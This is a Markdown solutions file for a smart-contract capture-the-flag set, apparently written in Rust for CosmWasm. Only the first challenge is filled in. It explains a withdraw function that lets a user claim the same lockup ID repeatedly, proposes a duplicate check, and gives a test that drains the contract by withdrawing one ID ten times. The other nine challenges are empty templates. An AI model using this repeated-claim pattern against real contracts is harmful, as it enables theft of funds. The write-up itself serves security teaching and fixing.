# Solutions to the CTF

## Challenge 01: *Mjolnir*

### Description

Hello guys my name is Jess I am a security researcher mostly in the area of Windows binary exploitation.
I think the isse in this challenge, is that in the withraw() function in contract.rs, on L#94, you can
claim multiple times for the same ID. You could fix this by keeping a list of unlocked lockup ids, and
return Err if this list contains the lockup.id

(I think there are also some fancy slice tricks which you could use to deduplicate vec entries without
adding an extra mem allocation, but don't think is stabilized yet, just in nightly; also this way makes
the developer's intention clear)

Incidentally this is kind of reminescent of the Mirror exploit from the halcyon days of 2021 :)
  
### Recommendation

error.rs:
```rust
#[derive(Error, Debug)]
pub enum ContractError {
    #[error("{0}")]
    Std(#[from] StdError),

    #[error("Unauthorized")]
    Unauthorized {},

    #[error("Duplicate Position")]
    DuplicatePosition {},
}
```

contract.rs:
```rust
    let mut unlocked_ids: Vec<Uint128> = vec![];
    for lockup in lockups {
        // validate owner and time
        if lockup.owner != info.sender || env.block.time < lockup.release_timestamp {
            return Err(ContractError::Unauthorized {});
        }

        // validate position lockup
        if unlocked_ids.contains(lockup.id) {
            return Err(ContractError::DuplicatePosition {});
        }
        // push lockup id
        unlocked_ids.push(lockup.id);

        // increase total amount
        total_amount += lockup.amount;

        // remove from storage
        LOCKUPS.remove(deps.storage, lockup.id);
    }
```

### Proof of concept

```rust
    #[test]
    fn exploit() {
        let (mut app, contract_addr) = proper_instantiate();

        let sender = Addr::unchecked(USER);

        // test query
        let msg = QueryMsg::GetLockup { id: 1 };
        let lockup: Lockup = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &msg)
            .unwrap();
        assert_eq!(lockup.amount, MINIMUM_DEPOSIT_AMOUNT);
        assert_eq!(lockup.owner, sender);

        // fast forward 24 hrs
        app.update_block(|block| {
            block.time = block.time.plus_seconds(LOCK_PERIOD);
        });

        // test withdraw
        // claim for the same id repeatedly
        let msg = ExecuteMsg::Withdraw { ids: vec![1,1,1,1,1,1,1,1,1,1] };
        app.execute_contract(sender, contract_addr, &msg, &[])
            .unwrap();

        // verify funds received
        let balance = app.wrap().query_balance(USER, DENOM).unwrap().amount;
        // contract was funded with 10 deposit_amount
        assert_eq!(balance, MINIMUM_DEPOSIT_AMOUNT * Uint128::new(10));
    }
```

---

## Challenge 02: *Gungnir*

### Description

The bug occurs in ...

### Recommendation

The fix should be ...

### Proof of concept

```rust
// code goes here
```

---

## Challenge 03: *Laevateinn*

### Description

The bug occurs in ...

### Recommendation

The fix should be ...

### Proof of concept

```rust
// code goes here
```

---

## Challenge 04: *Gram*

### Description

The bug occurs in ...

### Recommendation

The fix should be ...

### Proof of concept

```rust
// code goes here
```

---

## Challenge 05: *Draupnir*

### Description

The bug occurs in ...

### Recommendation

The fix should be ...

### Proof of concept

```rust
// code goes here
```

---

## Challenge 06: *Hofund*

### Description

The bug occurs in ...

### Recommendation

The fix should be ...

### Proof of concept

```rust
// code goes here
```

---

## Challenge 07: *Tyrfing*

### Description

The bug occurs in ...

### Recommendation

The fix should be ...

### Proof of concept

```rust
// code goes here
```

---

## Challenge 08: *Gjallarhorn*

### Description

The bug occurs in ...

### Recommendation

The fix should be ...

### Proof of concept

```rust
// code goes here
```

---

## Challenge 09: *Brisingamen*

### Description

The bug occurs in ...

### Recommendation

The fix should be ...

### Proof of concept

```rust
// code goes here
```

---

## Challenge 10: *Mistilteinn*

### Description

The bug occurs in ...

### Recommendation

The fix should be ...

### Proof of concept

```rust
// code goes here
```
